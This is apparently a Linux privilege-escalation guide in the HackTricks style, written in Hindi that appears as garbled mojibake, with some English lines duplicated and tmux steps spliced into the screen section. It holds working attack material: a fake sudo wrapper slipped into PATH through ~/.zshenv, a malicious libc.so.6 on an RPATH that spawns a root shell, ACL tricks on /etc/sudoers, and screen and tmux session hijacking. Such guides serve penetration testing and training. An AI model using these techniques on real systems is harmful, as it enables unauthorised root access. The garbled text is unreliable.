рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рдЕрд▓рдЧ рд╢реЗрд▓ (рдмреИрд╢ рдирд╣реАрдВ) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ, рддреЛ рдЖрдкрдХреЛ рдирдП рдкрде рдЬреЛрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рддрд╛ рд╣реИред [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py) рдореЗрдВ рдЖрдкрдХреЛ рдПрдХ рдФрд░ рдЙрджрд╛рд╣рд░рдг рдорд┐рд▓реЗрдЧрд╛

рдпрд╛ рдРрд╕рд╛ рдХреБрдЫ рдЪрд▓рд╛рдПрдВ:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo тАШexport PATH=/tmp:$PATHтАЩ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## рд╕рд╛рдЭрд╛ рдкреБрд╕реНрддрдХрд╛рд▓рдп

### ld.so

рдлрд╝рд╛рдЗрд▓ `/etc/ld.so.conf` рдпрд╣ рджрд░реНрд╢рд╛рддреА рд╣реИ рдХрд┐ **рд▓реЛрдб рдХреА рдЧрдИ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдХрд╣рд╛рдВ рд╕реЗ рд╣реИрдВ**ред рдЖрдорддреМрд░ рдкрд░, рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкрде рд╣реЛрддрд╛ рд╣реИ: `include /etc/ld.so.conf.d/*.conf`

рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ `/etc/ld.so.conf.d/*.conf` рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ рдкрдврд╝реА рдЬрд╛рдПрдВрдЧреАред рдЗрд╕ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓реЗрдВ **рдЕрдиреНрдп рдлрд╝реЛрд▓реНрдбрд░реНрд╕ рдХреА рдУрд░ рдкрд╣реБрдВрдЪ рдХрд░реЗрдВрдЧреА** рдЬрд╣рд╛рдВ **рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ** рдЦреЛрдЬреА рдЬрд╛рдПрдВрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, `/etc/ld.so.conf.d/libc.conf` рдХреА рд╕рд╛рдордЧреНрд░реА `/usr/local/lib` рд╣реИред **рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рд┐рд╕реНрдЯрдо `/usr/local/lib` рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдЕрдВрджрд░ рдкреБрд╕реНрддрдХрд╛рд▓рдпреЗрдВ рдЦреЛрдЬреЗрдЧрд╛**ред

рдпрджрд┐ рдХрд┐рд╕реА рдХрд╛рд░рдгрд╡рд╢ **рдХрд┐рд╕реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ рдХрд┐рд╕реА рднреА рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдкрде рдкрд░: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рднреА рдлрд╝рд╛рдЗрд▓ рдпрд╛ `/etc/ld.so.conf.d/*.conf` рдХреЗ рдЕрдВрджрд░ рдХреЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдХреЛрдИ рднреА рдлрд╝реЛрд▓реНрдбрд░ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рд╡реНрдпрд╡рд╕реНрдерд╛рдкрдХреАрдп рдЕрдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рд╕рдХрддреА рд╣реИред\
рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдореЗрдВ рдЗрд╕ рдЧрд▓рдд рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХрд╛ рд╢реЛрдз рдХрд░рдиреЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ **рдХреИрд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
рдЬрдм рдЖрдк `/var/tmp/flag15/` рдореЗрдВ lib рдХреА рдХреЙрдкреА рдХрд░рддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдкреНрд░реЛрдЧреНрд░рд╛рдо рджреНрд╡рд╛рд░рд╛ рдЗрд╕ рд╕реНрдерд╛рди рдкрд░ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреИрд╕рд╛ рдХрд┐ `RPATH` рдЪрд░ рдореЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
рддреЛ `/var/tmp` рдореЗрдВ `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6` рдХреЗ рд╕рд╛рде рдПрдХ рджреБрд╖реНрдЯ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдмрдирд╛рдПрдВред
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## рдХреНрд╖рдорддрд╛рдПрдВ

Linux рдХреНрд╖рдорддрд╛рдПрдВ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдЙрдкрд▓рдмреНрдз рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рдПрдХ рдЙрдкрд╕рдореВрд╣ рдкреНрд░рджрд╛рди рдХрд░рддреА рд╣реИред рдпрд╣ рдЕрд╕рд▓ рдореЗрдВ рд░реВрдЯ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдЫреЛрдЯреЗ рдФрд░ рд╡рд┐рд╢рд┐рд╖реНрдЯ рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╡рд┐рднрд╛рдЬрд┐рдд рдХрд░рддрд╛ рд╣реИред рдЗрди рдЗрдХрд╛рдЗрдпреЛрдВ рдореЗрдВ рд╕реЗ рдкреНрд░рддреНрдпреЗрдХ рдХреЛ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕ рддрд░реАрдХреЗ рд╕реЗ рдкреВрд░реА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╕реЗрдЯ рдХрдо рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рдЙрддреНрдкрд╛рджрди рдХреЗ рдЬреЛрдЦрд┐рдо рдХреЛ рдХрдо рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдХреНрд╖рдорддрд╛рдУрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдП, рдЗрд╕реЗ рдЬрд╛рдирдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреГрд╖реНрда рдХреЛ рдкрдврд╝реЗрдВ:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдЕрдиреБрдорддрд┐рдпрд╛рдБ

рдПрдХ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдореЗрдВ, "рдЪрд▓рд╛рдиреЗ" рдХреЗ рд▓рд┐рдП рдмрд┐рдЯ рдпрд╣ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдХрд┐ рдкреНрд░рднрд╛рд╡рд┐рдд рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ "cd" рдХрд░ рд╕рдХрддрд╛ рд╣реИред\
"рдкрдврд╝рдиреЗ" рдмрд┐рдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреА рд╕реВрдЪреА рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ "рд▓рд┐рдЦрдиреЗ" рдмрд┐рдЯ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рд╣рдЯрд╛рдиреЗ рдФрд░ рдирдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИред

## ACLs

ACLs (Access Control Lists) рд╡рд┐рд╡реЗрдХрд╛рдзреАрди рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЗ рджреВрд╕рд░реЗ рд╕реНрддрд░ рд╣реИрдВ, рдЬреЛ рдорд╛рдирдХ ugo/rwx рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреЛ рдЕрдзрд┐рд░реЛрд╣рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рд╣реА рдврдВрдЧ рд╕реЗ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рдкрд░ рд╡реЗ рдЖрдкрдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЗ рдЙрдкрдпреЛрдЧ рддрдХ рдкрд╣реБрдВрдЪ рд╕реЗрдЯ рдХрд░рдиреЗ рдореЗрдВ рдмреЗрд╣рддрд░ рд╡рд┐рд╕реНрддрд╛рд░рдг рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдПрдХ рд╡рд┐рд╢реЗрд╖ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкрд╣реБрдВрдЪ рджреЗрдиреЗ рдпрд╛ рдЗрдирдХрд╛рд░ рдХрд░рдиреЗ рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЬреЛ рди рддреЛ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдорд╛рд▓рд┐рдХ рд╣реИ рдФрд░ рди рд╣реА рд╕рдореВрд╣ рдХреЗ рдорд╛рд▓рд┐рдХ рд╣реИ (рдпрд╣рд╛рдВ рд╕реЗ [**рдпрд╣рд╛рдВ**](https://linuxconfig.org/how-to-manage-acls-on-linux))ред\
рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ "kali" рдХреЛ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдкрд░ рдкрдврд╝рдиреЗ рдФрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВ:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**рд╕рд┐рд╕реНрдЯрдо рд╕реЗ** рд╡рд┐рд╢рд┐рд╖реНрдЯ ACL рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## рдЦреБрд▓реА рд╢реИрд▓ рд╕рддреНрд░

**рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк рдХрд┐рд╕реА рдЕрд▓рдЧ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ (**рд░реВрдЯ**) рдХреЗ рдХреБрдЫ рд╢реИрд▓ рд╕рддреНрд░ рдХреЛ **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдгреЛрдВ** рдореЗрдВ рдЖрдк рдХреЗрд╡рд▓ рдЕрдкрдиреЗ рд╣реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд╕реНрдХреНрд░реАрди рд╕рддреНрд░реЛрдВ рд╕реЗ **рдХрдиреЗрдХреНрдЯ** рд╣реЛ рд╕рдХреЗрдВрдЧреЗред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рд╕рддреНрд░ рдХреЗ рдЕрдВрджрд░ **рд░реЛрдЪрдХ рдЬрд╛рдирдХрд╛рд░реА рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рд╕реНрдХреНрд░реАрди рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА

```bash
screen -ls
```
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**рдПрдХ рд╕рддреНрд░ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ**

To attach to a session, use the following command:

рд╕рддреНрд░ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` рдХреЛ рдЙрд╕ рд╕рддреНрд░ рдХреЗ рдирд╛рдо рд╕реЗ рдмрджрд▓реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рд╕рдВрд▓рдЧреНрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

If you are unsure about the session name, you can list all the available sessions by running:

рдпрджрд┐ рдЖрдк рд╕рддреНрд░ рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдирд┐рд╢реНрдЪрд┐рдд рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рд╕рднреА рдЙрдкрд▓рдмреНрдз рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

рдЗрд╕рд╕реЗ рд╕рднреА рд╕рдХреНрд░рд┐рдп рд╕рддреНрд░реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрдЧреА рдЬрд┐рдирдХреЗ рдирд╛рдореЛрдВ рдХреЗ рд╕рд╛рдеред
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux рд╕реЗрд╢рди рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ

рдпрд╣ рдкреБрд░рд╛рдиреЗ tmux рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХреА рд╕рдорд╕реНрдпрд╛ рдереАред рдореИрдВ рдПрдХ рдЧреИрд░-рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рдмрдирд╛рдП рдЧрдП tmux (v2.1) рд╕реЗрд╢рди рдХреЛ рд╣рд╛рдЗрдЬреИрдХ рдирд╣реАрдВ рдХрд░ рд╕рдХрд╛ред

**tmux рд╕реЗрд╢рдиреЛрдВ рдХреА рд╕реВрдЪреА**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
**рдПрдХ рд╕рддреНрд░ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рдХрд░реЗрдВ**

To attach to a session, use the following command:

рд╕рддреНрд░ рдореЗрдВ рд╕рдВрд▓рдЧреНрди рд╣реЛрдиреЗ рдХреЗ рд▓рд┐рдП, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:

```bash
tmux attach-session -t <session_name>
```

Replace `<session_name>` with the name of the session you want to attach to.

`<session_name>` рдХреЛ рдЙрд╕ рд╕рддреНрд░ рдХреЗ рдирд╛рдо рд╕реЗ рдмрджрд▓реЗрдВ рдЬрд┐рд╕реЗ рдЖрдк рд╕рдВрд▓рдЧреНрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВред

If you are unsure about the session name, you can list all the available sessions by running:

рдпрджрд┐ рдЖрдк рд╕рддреНрд░ рдХреЗ рдирд╛рдо рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдирд┐рд╢реНрдЪрд┐рдд рд╣реИрдВ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрдорд╛рдВрдб рдЪрд▓рд╛рдХрд░ рд╕рднреА рдЙрдкрд▓рдмреНрдз рд╕рддреНрд░реЛрдВ рдХреА рд╕реВрдЪреА рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ:

```bash
tmux list-sessions
```

This will display a list of all the active sessions along with their names.

рдЗрд╕рд╕реЗ рд╕рднреА рд╕рдХреНрд░рд┐рдп рд╕рддреНрд░реЛрдВ рдХреА рдПрдХ рд╕реВрдЪреА рдкреНрд░рджрд░реНрд╢рд┐рдд рд╣реЛрдЧреА, рдЬрд┐рдирдХреЗ рдирд╛рдореЛрдВ рдХреЗ рд╕рд╛рдеред
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
рдПрдЪрдЯреАрдмреА рдХреЗ рд╡реЗрд▓реЗрдВрдЯрд╛рдЗрди рдмреЙрдХреНрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВред

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

рд╕рд┐рддрдВрдмрд░ 2006 рд╕реЗ рдордИ 13, 2008 рддрдХ рдХреЗ рдмреАрдЪ рдбреЗрдмрд┐рдпрди рдЖрдзрд╛рд░рд┐рдд рд╕рд┐рд╕реНрдЯрдореЛрдВ (рдЙрдмрдВрдЯреВ, рдХреБрдмрдВрдЯреВ, рдЖрджрд┐) рдкрд░ рдЬреЗрдирд░реЗрдЯ рдХреА рдЧрдИ рд╕рднреА SSL рдФрд░ SSH рдХреБрдВрдЬреАрдпреЛрдВ рдкрд░ рдЗрд╕ рдмрдЧ рдХрд╛ рдкреНрд░рднрд╛рд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдпрд╣ рдмрдЧ рдЙрд╕ рд╕рдордп рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЗрди рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдирдИ SSH рдХреБрдВрдЬреА рдмрдирд╛рдИ рдЬрд╛рддреА рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ рдХреЗрд╡рд▓ **32,768 рд╡рд┐рднрд┐рдиреНрдирддрд╛рдПрдВ рд╕рдВрднрд╡ рдереАрдВ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рд╕рднреА рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдЧрдгрдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ рдФрд░ **SSH рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдЖрдк рдЙрд╕рдХреЗ рд╕рдВрдмрдВрдзрд┐рдд рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдЖрдк рдпрд╣рд╛рдВ рдЧрдгрдирд╛ рдХреА рдЧрдИ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH рджрд┐рд▓рдЪрд╕реНрдк рд╕рдорд╛рдХреГрддрд┐ рдорд╛рди

* **PasswordAuthentication:** рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `рдирд╣реАрдВ` рд╣реИред
* **PubkeyAuthentication:** рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `рд╣рд╛рдБ` рд╣реИред
* **PermitEmptyPasswords**: рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрдиреЗ рдкрд░, рдпрд╣ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддрд╛ рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рдЦрд╛рд▓реА рдкрд╛рд╕рд╡рд░реНрдб рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╡рд╛рд▓реЗ рдЦрд╛рддреЛрдВ рдореЗрдВ рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВред рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `рдирд╣реАрдВ` рд╣реИред

### PermitRootLogin

рдпрд╣ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд░реВрдЯ ssh рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `рдирд╣реАрдВ` рд╣реИред рд╕рдВрднрд╛рд╡рд┐рдд рдорд╛рди:

* `рд╣рд╛рдБ`: рд░реВрдЯ рдкрд╛рд╕рд╡рд░реНрдб рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `without-password` рдпрд╛ `prohibit-password`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рд╣реА рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `forced-commands-only`: рд░реВрдЯ рдХреЗрд╡рд▓ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдФрд░ рдпрджрд┐ рдЖрдкрддреНрддрд┐рдЬрдирдХ рд╡рд┐рдХрд▓реНрдкреЛрдВ рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рд▓реЙрдЧрд┐рди рдХрд░ рд╕рдХрддрд╛ рд╣реИ
* `рдирд╣реАрдВ`: рдирд╣реАрдВ

### AuthorizedKeysFile

рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╡рд╛рд▓реЗ рдлрд╝рд╛рдЗрд▓реЗрдВ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддреА рд╣реИрдВред рдЗрд╕рдореЗрдВ `%h` рдЬреИрд╕реЗ рдЯреЛрдХрди рд╢рд╛рдорд┐рд▓ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреЛ рдШрд░ рдХреА рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рддрд┐рд╕реНрдерд╛рдкрд┐рдд рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗред **рдЖрдк рд╕рдЯреАрдХ рдкрде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** (рдЬреЛ `/` рд╕реЗ рдкреНрд░рд╛рд░рдВрдн рд╣реЛрддреЗ рд╣реИрдВ) рдпрд╛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╣реЛрдо рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╕рд╛рдкреЗрдХреНрд╖ рдкрде**ред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
